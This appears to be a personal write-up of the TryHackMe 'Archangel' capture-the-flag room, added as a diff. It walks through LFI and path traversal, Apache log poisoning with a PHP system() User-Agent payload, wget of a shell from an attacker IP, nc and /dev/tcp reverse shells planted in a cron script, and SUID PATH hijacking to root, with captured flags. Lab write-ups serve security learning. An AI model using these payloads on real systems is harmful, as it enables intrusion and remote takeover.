@@ -1,0 +1,161 @@
+[Archangel]
+[Enumeration]
+=>RustScan
+rustscan --ulimit 2000 -b 1000 -a <ip> -- -sV -sC -T 4
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+| http-robots.txt: 1 disallowed entry 
+|_/test.php
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+/etc/hosts/
+10.10.255.84 mafialive.thm
+Flag: thm{f0und_th3_r1ght_h0st_n4m3}
+
+=>Gobuster
+gobuster dir -u 10.10.255.84  -w /media/kali/save/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 
+
+[LFI]
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+=>Flag:thm{explo1t1ng_lf1}
+Using a simple PHP base64 filter allows the attacker to read the test.php source code. 
+The contents might reveal something interesting, such as a flag or even LFI filters 
+
+[Trying to get User Shell]
+We can bypass the slash condition with double backslah: ../.. -> ..//..
+mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd
+------------------------------------------------------------
+archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash 
+root:x:0:0:root:/root:/bin/bash daemon
+------------------------------------------------------------
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/apache2/envvars
+
+[Log poisoning]
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
+[BurpSuite]
+#SUCCESS REQUEST
+----------------------------------------------------------------------------------
+GET /test.php?view=/var/www/html/development_testing//////..///////..////..//////..///////..////..//////..///////..////..//////..///////..////..//////var/log/apache2/access.log&toxic=wget%2010.4.30.186/shell.php HTTP/1.1
+Host: mafialive.thm
+User-Agent: Mozilla/5.0 <?php passthru($_GET['toxic']);?>  Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+----------------------------------------------------------------------------------
+#SUCCESS SHELL
+http://mafialive.thm/test.php?view=/var/www/html/development_testing//////..///////..////..//////..///////..////..//////..///////..////..//////..///////..////..//////tmp/shell.php
+----------------------------------------------------------------------------------
+Fuzzing Wordlist:
+=>https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt
+----------------------------------------------------------------------------------
+User Agent:<?php echo system($_GET[‘cmd’]); ?>
+GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=ls HTTP/1.1
+Host: mafialive.thm
+User-Agent: Mozilla/5.0 <?php system($_GET['cmd']);?> Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+-----------------------------------------------------------------------------------------------------------------------
+[Victim Gets the payload]
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=wget%20http://10.4.30.186:8080/shell.php%20-o%20/tmp/shell.php
+[Success We got a Shell!]
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php
+$cat /home/archangel/user.txt
+User.txt:thm{lf1_t0_rc3_1s_tr1cky}
+
+[PrivEsc]
+$ find / -perm -4000 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ping
+
+kali@kali: python -m SimpleHTTPServer 8080
+vitim: $wget 10.4.30.186:8080/linpeas.sh
+#Stable Shell
+$python3 -c "import pty; pty.spawn('/bin/bash')"
+
+[Crontab]
+$cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+[Cronjob Privesc]
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.30.186 4444 >/tmp/f" > /opt/helloworld.sh
+----------------------------OR-------------------------------------
+printf 'bash -i >& /dev/tcp/10.9.10.123/1235 0>&1\n' >> helloworld.sh
+< /dev/tcp/10.4.30.186/4444 0>&1\n' >> helloworld.sh
+Flag:thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+
+[User 2 PrivEsc]
+#SUID
+-rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup
+$strings backup:
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+echo #!/bin/bash > cp
+echo /bin/bash -p > cp
+chmod +x cp
+export PATH=$PWD:$PATH
+archangel@ubuntu:~/secret$ which cp
+/home/archangel/secret/cp
+archangel@ubuntu:~/secret$ ./backup
+root@ubuntu:~/secret# cat /root/root.txt 
+thm{[REDACTED]
+-----------------------OR--------------------------------
+archangel@ubuntu:~/secret$ printf '/bin/sh\n' > cp
+printf '/bin/sh\n' > cp
+archangel@ubuntu:~/secret$ chmod +x cp
+chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
+archangel@ubuntu:~/secret$ ./backup
+./backup
+id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+-----------------------------------------------------------
+#FINALLY GOT ROOT
+$ echo /bin/bash -p >> cp
+$ chmod +x cp
+$ which cp
+/bin/cp
+$ export PATH=$PWD:$PATH
+$ echo $PATH
+/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+$ which cp
+/home/archangel/secret/cp
+$ ./backup
+whoami
+root
+cd /root 
+cat root.txt
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
